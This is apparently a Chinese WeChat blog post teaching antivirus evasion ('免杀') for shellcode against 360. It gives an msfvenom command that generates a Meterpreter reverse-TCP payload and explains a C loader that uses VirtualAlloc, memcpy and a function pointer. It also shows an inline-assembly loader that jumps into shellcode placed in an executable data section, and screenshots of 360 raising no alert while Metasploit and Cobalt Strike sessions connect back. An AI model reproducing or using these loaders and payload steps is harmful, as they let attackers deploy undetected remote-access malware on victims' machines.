<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BWV50rH729HEFVTOYiZdSQ)

**shellcode 免杀（1）C 语言三条指令免杀 360**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgzFsgvIIOV9BIRxqm8wl8QXOiaVmgia8zKmTGricia87sGYnST39IGAX9og/640?wx_fmt=gif)

**_**1**_**

**简介  
**

    各位师傅们好，之前也发过一些基础渗透水文，这次是第一次写点正经干货，描述有错的地方各位师傅海涵。

本来是想写 PHP 审计的，结果月师傅让我写免杀，经过一下午的 c 语言测试，得出了十多种过 360 的方法，这里拿三种 c 的方式过 360（思路大体相同），还有一个 c++ 的免杀 360 和火绒都可以过等第二篇再讲。

**_**2**_**

**免杀过程**

废话就不多讲了对于初学者友好发展，先看一遍制作过程，我们准备好 msf 和 cs 的 shllecode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST="自己IP" LPORT="自己的端口" -f c > shell.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgJRaoYzCn7V7yglUQSzmVCDJuHJHjldhk0PLdLRqRbgXLzqckBbbYzw/640?wx_fmt=png)

CS 生成 shellcode，要用 c 语言的 shellcode，每个语言的解析 shellcode 方式不同所以这里要选好语言形式。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgTxibxtm13nlvJO9ibNH2CA3ybOXY2IvwTwC0pXqUJZes3lZcmCChnKiag/640?wx_fmt=png)

接下来就是把这些 shellcode 放到源码里进行免杀上线了，接下来的三种 c 语言免杀都是只能过 360 的，火绒动态被查，但是最后的 c++ 是两个都可以过的，先来看个正经 c 语言免杀

看下图，没错 c 语言免杀就需要这点代码，而且这是八年前的代码，如果研究免杀的朋友应该很眼熟毕竟也是传烂了，本文也主要为了解析免杀，我们来一步步分析。

**从这里开始麻烦真的想学免杀的仔细阅读，这是最简单的入门，如果你看不下去就不要学了。**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgficx0Ntpia4Y0rDibOA4RkK4J10mImcpLedfEviacGDefqCvUhzWRCibYTw/640?wx_fmt=png)

前三行其实就和 Java，python 的 import 一样；第四行也就是我们箭头指的这行是隐藏弹出窗口，也就是不让控制台蹦出来，至于 unsignedchar 指无符号类型的字符数组，这里各位理解为扩容就行了

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrg2AO3XFHfxCib5QqsZ1nFLxSV8FicFgOdZ8MuZISiajeheIjPiagfiahPK2w/640?wx_fmt=png)

下边为代码主要部分，pvoid 就是指针，学过 c 语言的朋友都知道基本都用 * 代替了这里方便讲解就用了本体类型

*P=null；_//_ _就是创建变量并且赋值_  
inta；_//_ _一样的性质，__*p= null_ _其实就是_ _inta =0__；_  
**typedef**void（_stdcall*CODE)_//_ _给类型起别名，也可以用指针代替原函数，我们说的简单点这里就是将___stdcall_ _函数利用指针特性附给了我们自己起的_ _CODE_ _函数里，指针就是变量容器，但是指针存的是地址，也就是我把___stdcall_ _的地址存到了_ _CODE_ _里所以它的值也都在里边了，但是_ _CODE_ _还是_ _CODE_ _并有自己的地址。这里各位别深究，你就当继承了就行。_ 

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgsaYgkemicl4O8s36sz8qSGCmEzW5lthLhQF15bUib2vT8yP0PbtGLFug/640?wx_fmt=png)

这里是最主要的，我们详细来讲解一下。

VirtualAlloc，是 win32 的 api 函数，是用来申请动态内存的，动态内存我们可以通俗的理解为，主动式保护内存，可以根据我们自己决定是否存在，打个比喻，一个苹果吃完就没有了，但是一整棵树的苹果你想吃哪个吃哪个，有的朋友可能会想这不还是能吃完么，当然了，内存又不是无限的，这个申请动态内存就是在有限的范围留出你想要的地方。

VirtualAlloc(NULL,**sizeof**(shellcode),MEM_COMMIT |MEM_RESERVE,PAGE_EXECUTE_READWRITE);_//_ _函数内参数（要分配的内存区域的地址，分配的大小，分配的类型， 该内存的初始保护属性）_

这里的 NULL 是让系统自己分配内存地址；内存大小就是经典的 sizeof 了；

MEM_COMMIT |MEM_RESERVE：**为特定的页面区域分配内存中或磁盘的页面文件中的物理内存，或保存地址而不分配物理存储，也就是保留这一个地址随时可利用**；

PAGE_EXECUTE_READWRITE：**可执行可读模式，可以理解为申请权限**；

**到了这里我们来总结这串代码具体意思：**

” **我申请了一块土地，土地大小是** **shellcode****，我要用这块土地都给我腾出地，我不用这块土地但这土地就是我的** **-** **我不用你们也不准用，这土地谁都能看明白是我的并且只有我可以动 “**

接下来看这块，if 那里就是如果没有 shellcode 就直接结束进程了

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgk1DFj3oLjco93pP7iaqdW1OhLhFFmhsicOicDzKSt5VK81A65LhHQveNQ/640?wx_fmt=png)

memcpy 函数，拷贝内存数据，和我们平时用的 copy 一样；

p：容器，也就是要接受数据的目标数组；

shellcode：复制的数据源；

sizeof（）：复制的大小；

代码解释：把多大的 code 存到 p 指针里；

CODE=_stdcall，code=（_stdcall)p

这里要好好看，前边我们已经给 stdcall 改了名字叫 CODE，而 stdcall 的作用是从右向左压栈，这里是函数详细代码解析，不会汇编的朋友跳过就行也没必要深究本质

pushebp 保存 ebp 寄存器，该寄存器将用来保存堆栈的栈顶指针，可以在函数退出时恢复 mov ebp,esp 保存堆栈指针 moveax,[ebp + 8H] 堆栈中 ebp 指向位置之前依次保存有

```
ebp,cs:eip,a,b,ebp+8指向a
add eax,[ebp + 0CH] 堆栈中ebp+ 12处保存了b
mov esp,ebp 恢复esp
pop ebp
ret8
```

我们这里再把之前赋值给 p 的数据拿来

```
VirtualAlloc(NULL,sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

从右向左，也就是先申请保护内存，可读可用，之后占用好不让别人动，大小为 code 大小，最后系统你看着办给我个地儿。  

最后使用 code（）；

到这我们算是把这个代码讲解完了，进行总结：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgNCC2ibPDsQ5kswFYtNk1pEsGDoqqaz3lC73ibFfRcTZpKPGvxmVLYtibQ/640?wx_fmt=png)

准备好调用头文件，其实和 Java 的依赖差不多；

把_stdcall 改名为 CODE，再隐藏弹窗；

将 code 存入 shellcode 数组；

创建指针变量 p 赋值为空方便存储；

将 VirtuallAlloc 函数存入 p 申请动态内存并保护；

如果 shellcode 为空则结束；

复制 shellcode 进 p；

从右向左压栈；

code（）执行。

终于到了看效果的时候了，把我们的 shellcode 放进去并生成 exe 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgIcmk63kgIYJhuGibBuzR6OI31DnuicwkgsvCyf6DFC7Y0gweDibosJJAQ/640?wx_fmt=png)

来用 360 扫一下看看，没有报毒

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgicrmMyIyNyMUZRHqUykTaHpIMHlNDQpdR3qJ5ey9ic4ucX7YP1sZJzYA/640?wx_fmt=png)

msf 准备好监听看看能否上线并操作，可以上线并操作

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgWRM1D9rIT6DSLJibVulkeUDHZib8k3Yrjx4AKkyfBiawianV60zwf0QAnQ/640?wx_fmt=png)

接下来看 cs 的

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgZFPS3iaqNDCAY46JE7CLVLdcvaF8UmJ7reicsjlpicxmrq7gcv6wNiaTsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgZX6NLy1sCWrynyfyEz4DMpsEH8QdsAFIy1C1jgb2xcuYg8oB7jQPiag/640?wx_fmt=png)

看看运行，上线

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgricQLaauVIZyffDhPiauGGkFMywoa6h6yRCVS1P9Vlpyu8icT1pnZwduQ/640?wx_fmt=png)

来看另外两个免杀，只需要三行指令即可免杀

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgCVPwwddTsum1jhHVcm7sicRFM910aeUrNYtySVicf86qdQlZXURcWnjQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgPXGf03Mxps9ZTVtA3SCpk7QHrCt7uC14sWEEVM0Ba2V1iclau7hkDkQ/640?wx_fmt=png)

这里是嵌入式汇编呼叫 ShellCode，学汇编的一看就明白了，鉴于很多开始专注于 web 渗透的师傅们很多不了解汇编我们这里简单讲解一下

```
#pragmacomment(linker, "/section:.data,RWE")
VOIDmain()
{
   __asm
   {
       
       mov eax,offset ShellCode
       jmp eax

   }
}
```

**#pragma comment(linker,"/section:.data,RWE")****，这个等于之前的** **VirtualAlloc****；**

**__asm** **内联调用汇编语言达到不冲突可运行；**

**调用** **offset** **函数引用** **shellcode** **进入** **eax** **寄存器；**

**jmp** **无条件跳转进** **eax** **寄存器执行；**

没错，运用汇编就是这么轻松，加上创建内联，实际只用两条指令就可以轻松过 360，过多的不介绍了，看运行结果

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgptpbB79iazsgR3kIoxEXn8icg85RLcwvFxtXKZic9Xm8Gmsvr7mJ8GVaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgpyCxQ25jFeUWtBKcOz5nxfQGEJIwDcoMLiamFEcZTVTstnaj3lPLgIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgrn3mlkF2Tu7nVVRNpI4uWrSt7gNmXa2iaEKTIDSlEia5DdpLdTicdq9gQ/640?wx_fmt=png)

本来是想把 c++ 的一起发出来的，可是没想到 c 语言的就这么多了，等第二篇详细讲解 c++ 如何过 360 与火绒的吧，希望各位师傅指出错误多多包涵。源码我就不留了，老师傅不需要，新手多敲敲熟练对吧。

最后，若想渗透好，就别要男女朋友，对象只会影响你的大脑思考。

**_**4**_**

**关注  
**

**关注本公众号 不定期更新文章和视频**

**欢迎前来关注**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgl8diaY2GXsfZMFc51xPo1LnoILWzd7hN8IgnlSRTJRlibicibQfZR2HvrQ/640?wx_fmt=jpeg)

**渗透测试培训 l 联系**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADK7mGhhetgt9ZgwdJRMcrgb3Bs6Gbp4WRQddIWAyia7uCrz7G2cibibL5sR767XcMdic7niaeA0fLofwg/640?wx_fmt=png)